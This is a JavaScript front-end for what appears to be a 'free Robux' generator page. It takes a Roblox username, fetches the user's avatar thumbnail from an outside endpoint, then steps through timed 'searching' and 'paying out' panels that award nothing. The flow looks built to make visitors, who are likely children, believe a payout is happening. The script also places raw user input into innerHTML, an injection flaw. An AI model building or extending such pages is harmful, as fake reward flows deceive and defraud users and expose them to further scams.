document.addEventListener("DOMContentLoaded", function () {
    const rbxbtn = document.querySelector(".getrbx");
    const box1 = document.querySelector(".box");
    const box2 = document.querySelector(".box2");
    const box3 = document.querySelector(".box3");
    const box4 = document.querySelector(".box4");
    const rbxtotal = document.querySelectorAll(".details");
    const username = document.querySelector(".username");
    const useroutput = document.querySelector(".useroutput");
    let thumbnailUrl = ""; // Store thumbnail URL

    console.log("DOM fully loaded and parsed");

    // Function to handle Next button click/touch
    const handleNextButtonClick = (event) => {
        event.preventDefault(); // Prevent any default action
        console.log("Next button clicked or touched"); // Debugging line to check click events
        console.log("Username entered:", username.value); // Debugging line to check if username value is being captured

        if (username.value.length <= 2) {
            alert("Please enter a valid username");
        } else {
            useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
            updateUsernameDisplay(); // Update username display immediately
            fetchThumbnail(username.value).then(url => {
                thumbnailUrl = url;
                box1.style.display = "none";
                box2.style.display = "block";
                setTimeout(() => {
                    showbox2();
                    showbox3();
                    displayThumbnail();
                    updateUsernameDisplay(); // Ensure username is displayed in "Paying out" section
                }, 2500);
            }).catch(error => {
                alert("User doesn't exist. Please enter a valid username.");
                console.error(error);
            });
        }
    };

    // Attach event listeners for "Next" button
    rbxbtn.addEventListener("click", handleNextButtonClick);
    rbxbtn.addEventListener("touchend", handleNextButtonClick); // Added for mobile devices

    // Function to handle Robux amount button click/touch
    const handleRobuxButtonClick = (event) => {
        event.preventDefault(); // Prevent any default action
        console.log("Robux amount button clicked or touched");
        updateUsernameDisplay(); // Update the username display in payout section
        box3.style.display = "none";
        box2.style.display = "block";
        setTimeout(showboxagain, 2500);
        setTimeout(showbox4, 2500);
    };

    // Attach event listeners for each Robux amount detail button
    rbxtotal.forEach((btn) => {
        btn.addEventListener("click", handleRobuxButtonClick);
        btn.addEventListener("touchend", handleRobuxButtonClick); // Added for mobile devices
    });

    // Function to update the username display in the payout section
    function updateUsernameDisplay() {
        const usernameDisplay = document.getElementById('usernameDisplay');
        if (usernameDisplay) {
            usernameDisplay.textContent = username.value;
        }
    }

    let showboxagain = () => {
        box2.style.display = "none";
    };
    let showbox2 = () => {
        box2.style.display = "none";
    };
    let showbox3 = () => {
        box3.style.display = "block";
    };
    let showbox4 = () => {
        box4.style.display = "block";
    };

    // Function to fetch thumbnail URL
    async function fetchThumbnail(username) {
        console.log("Fetching thumbnail for username:", username);
        try {
            const response = await fetch('https://get-thumbnail-vercel.vercel.app/get_thumbnail', { // Replace with your actual endpoint URL
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username: username })
            });

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }

            const data = await response.json();
            console.log("API Response:", data);  // Debugging log

            if (data.thumbnailUrl) {
                return data.thumbnailUrl;
            } else {
                throw new Error('Thumbnail not found');
            }
        } catch (error) {
            console.error("Error fetching thumbnail:", error);
            throw error;
        }
    }

    // Function to display thumbnail in box3 without clearing existing elements
    function displayThumbnail() {
        if (thumbnailUrl) {
            console.log("Displaying thumbnail in box3:", thumbnailUrl);  // Debugging log
            
            // Create a container for the thumbnail
            const thumbnailContainer = document.createElement("div");
            thumbnailContainer.className = "thumbnail-container"; // Added class for styling
            thumbnailContainer.innerHTML = `<img src="${thumbnailUrl}" alt="Roblox Thumbnail">`;

            // Append the new thumbnail to box3 without clearing existing content
            box3.appendChild(thumbnailContainer);
        } else {
            console.error("No thumbnail URL available to display.");
        }
    }
});
